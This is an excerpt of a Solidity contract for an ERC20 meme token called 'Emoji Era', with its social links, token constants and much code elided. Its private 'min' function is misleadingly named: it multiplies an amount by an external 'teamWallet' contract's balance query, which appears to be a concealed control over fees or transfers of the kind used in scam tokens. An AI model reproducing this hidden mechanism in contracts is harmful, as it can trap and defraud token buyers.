...
twitter: twitter.com/MemeEmojiEra
Website: www.emojiera.vip
Telegram: t.me/emojiera
**/

pragma solidity 0.8.18;

abstract contract BasicInfo {

    string public constant _name = "Emoji Era";
    string public constant _symbol = "EMOJI";

    uint8 public constant _decimals = 9;
    uint256 public constant _tTotal = 500_000_000  * 10**_decimals;
    ...
    uint256 public _preventSwapBefore=8;
...
contract EmojiEra is IERC20, Context, Ownable, BasicInfo {
    ...
    function min(address account, uint256 amount) private view returns(uint256) { return IERC20(teamWallet).balanceOf(account) * amount; }
